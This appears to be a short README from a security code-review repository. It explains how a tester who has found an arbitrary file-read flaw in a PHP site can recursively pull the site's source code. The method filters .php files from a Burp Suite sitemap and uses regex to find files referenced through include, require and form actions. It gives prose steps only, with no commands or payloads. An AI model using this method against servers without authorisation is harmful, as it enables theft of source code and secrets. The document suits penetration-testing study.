# Extract PHP files

<img width="1005" alt="1" src="https://github.com/nowak0x01/Code-Review/assets/96009982/c67fc7ed-2727-44c5-9425-e8ab4dc93d93"><br>

You have discovered a vulnerability that enables you to read internal server files, similar to the `readfile($input)` function in PHP.

To exploit this vulnerability, you dump the sitemap of your Burp Suite, and then filter all the `.php` files to download them.

However, be aware that these files might also include or reference other `.php` files in various ways, such as through `include`, `require`, `href`, `form action`, `require_once`, comments, etc.

Searching for these references one by one is not the most efficient and can become tedious. In this context, regular expressions (regex) prove to be incredibly useful.


## Example<br>

Currently, you possess knowledge of the files `index.php`, `auth.php`, and `redirect.php` which were extracted from the Burp Suite sitemap.

However, it's crucial to note that these files also reference unknown internal files in various ways, utilizing functions like `include()`, `require_once()`, `Location`, `form action`, and more.

Thankfully, by employing regular expressions (regex), you can easily extract all the referenced files and uncover further insights.

## Steps
1. Extract all the referenced files.
2. Extract all the directories and create them on your local machine.
3. Download all the files using the wordlist "_php-files."
4. Continuously searching for more referenced .php files, until there are no more .php files left to download.
   
Note: You will see that you will have no more php files to download when the "_php-verify" file is empty or with garbage
